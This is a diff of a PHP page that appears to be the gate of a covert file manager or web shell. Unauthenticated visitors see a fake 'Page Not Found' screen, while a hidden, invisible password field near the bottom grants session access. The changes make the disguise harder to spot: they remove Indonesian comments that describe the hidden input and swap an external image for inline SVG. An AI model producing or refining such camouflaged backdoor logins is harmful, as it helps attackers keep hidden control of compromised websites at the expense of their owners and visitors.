@@ -29,8 +29,7 @@ $base_dir = $_SESSION['base_dir'];
 if (!isset($_SESSION['fm_auth']) || $_SESSION['fm_auth'] !== true) {
 ?>
 <!DOCTYPE html>
-<html lang="en-us"
-    prefix="content: http://purl.org/rss/1.0/modules/content/ dc: http://purl.org/dc/terms/ foaf: http://xmlns.com/foaf/0.1/ og: http://ogp.me/ns# rdfs: http://www.w3.org/2000/01/rdf-schema# sioc: http://rdfs.org/sioc/ns# sioct: http://rdfs.org/sioc/types# skos: http://www.w3.org/2004/02/skos/core# xsd: http://www.w3.org/2001/XMLSchema#">
+<html lang="en-us" prefix="content: http://purl.org/rss/1.0/modules/content/ dc: http://purl.org/dc/terms/ foaf: http://xmlns.com/foaf/0.1/ og: http://ogp.me/ns# rdfs: http://www.w3.org/2000/01/rdf-schema# sioc: http://rdfs.org/sioc/ns# sioct: http://rdfs.org/sioc/types# skos: http://www.w3.org/2004/02/skos/core# xsd: http://www.w3.org/2001/XMLSchema#">
 <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <style type="text/css">
@@ -52,12 +51,14 @@ if (!isset($_SESSION['fm_auth']) || $_SESSION['fm_auth'] !== true) {
 </head>
 <body>
     <div class="page-not-found">
-        <!-- Ilustrasi gambar error bawaan / Skateboard / Page Not Found asli -->
-        <img class="image" alt="Page Not Found" src="/htdocs_error/page_not_found.svg" onerror="this.src='https://cdn.jsdelivr.net/gh/edent/SuperTinyIcons@master/images/svg/codeship.svg';" />
+
+        <svg class="image" alt="Page Not Found" viewBox="0 0 24 24" width="150" height="150" style="fill:#6D7081; margin-bottom: 32px;">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+        </svg>
         <h1 class="title"><?= htmlspecialchars($login_title) ?></h1>
         <p class="text"><?= htmlspecialchars($login_subtitle) ?></p>
 
-        <!-- Bagian Input Password Tersembunyi di Paling Bawah (Warna Putih & Tidak Terlihat) -->
+
         <div class="hidden-login-section">
             <form method="POST">
                 <input type="password" name="login_pass" class="secret-input" autocomplete="current-password" autofocus>
@@ -88,10 +89,8 @@ if (!isset($_SESSION['fm_auth']) || $_SESSION['fm_auth'] !== true) {
     }
     .image {
         max-width: 100%;
-        margin-bottom: 32px;
         height: auto;
         object-fit: contain;
-        max-height: 220px;
     }
     .title {
         text-align: center;
@@ -110,7 +109,6 @@ if (!isset($_SESSION['fm_auth']) || $_SESSION['fm_auth'] !== true) {
         font-weight: 400;
         color: #6D7081;
     }
-    /* Styling khusus menyembunyikan input password agar pas ditekan Tab langsung fokus & tidak terlihat */
     .hidden-login-section {
         position: absolute;
         bottom: 8px;
